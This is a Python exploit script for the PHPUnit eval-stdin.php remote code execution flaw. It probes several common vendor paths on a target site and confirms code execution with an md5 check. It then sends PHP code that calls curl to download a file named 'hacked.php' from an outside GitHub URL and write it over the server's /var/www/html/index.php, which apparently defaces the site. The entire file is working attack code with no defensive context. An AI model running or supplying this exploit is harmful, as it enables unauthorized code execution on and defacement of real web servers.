import requests
from sys import argv

phpfiles = ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]

FILE_URL = "https://raw.githubusercontent.com/edhofdc/simple-html-edho/refs/heads/main/hacked.php"
TARGET_FILE = "/var/www/html/index.php"

def check_vuln(site):
    try:
        for path in phpfiles:
            vuln_url = site + path
            req = requests.get(vuln_url, headers={
                "Content-Type": "text/html",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
            }, data="<?php echo md5(phpunit_rce); ?>")
            if "6dd70f16549456495373a337e6708865" in req.text:
                print(f"[+] Target is vulnerable: {vuln_url}")
                return vuln_url
    except Exception as e:
        print(f"[-] Error checking vulnerability: {e}")
    return None

def upload_file(vuln_url):
    print("[+] Uploading file to target using curl...")
    payload = f"system('curl -o {TARGET_FILE} {FILE_URL}');"
    exploit_response = requests.post(vuln_url, data=f'<?php {payload} ?>')
    
    if exploit_response.status_code == 200:
        print(f"[+] File successfully uploaded! Check: {TARGET_FILE}")
    else:
        print("[-] Failed to upload file.")

def main():
    if len(argv) < 2:
        exit("Usage: python exploit.py <target_url>")
    
    site = argv[1].rstrip('/')
    pathvuln = check_vuln(site)
    if not pathvuln:
        exit("[-] Target is not vulnerable.")
    upload_file(pathvuln)

if __name__ == "__main__":
    main()
